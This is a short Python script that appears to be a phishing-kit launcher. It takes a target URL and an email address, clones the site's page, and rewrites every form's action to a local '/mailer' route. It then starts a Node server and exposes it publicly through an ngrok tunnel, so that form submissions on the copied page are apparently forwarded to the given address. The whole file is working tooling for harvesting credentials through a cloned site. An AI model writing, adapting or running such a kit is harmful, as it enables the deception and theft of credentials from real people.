import os, requests, re, json, subprocess, signal, atexit

global child_pid

def kill_child():
    if child_pid is None:
        pass
    else:
        os.kill(child_pid, signal.SIGTERM)

url = input("Enter URL (http(s)://website.com) : ")
mailto = input("Enter receiving mail address: ")
urljson = {
    'url': url,
    'mail': mailto
}
with open('url.json', 'w+') as f:
    json.dump(urljson, f)


res = requests.get(url).text
pwd = os.getcwd()
fileaddr = os.path.join(pwd, "index.html")
with open(fileaddr, 'w+', encoding='utf-8') as f:
    result = re.sub('((?<=((href=")))|(?<=((src="))))/(.+?)(?=")',
                    url+'/'+r'\6', res)
    result = re.sub('(?<=action=").+?(?=")', '/mailer', result)
    f.seek(0)
    f.write(result)

# for i in range(2):
#     pid = os.fork()
#     if pid == 0:
#         os.system('node index.js')
#     else:

p1 = subprocess.Popen('node index.js', stdout=subprocess.PIPE, shell=True)
child_pid = p1.pid
os.system('./ngrok http 2020')
atexit.register(kill_child)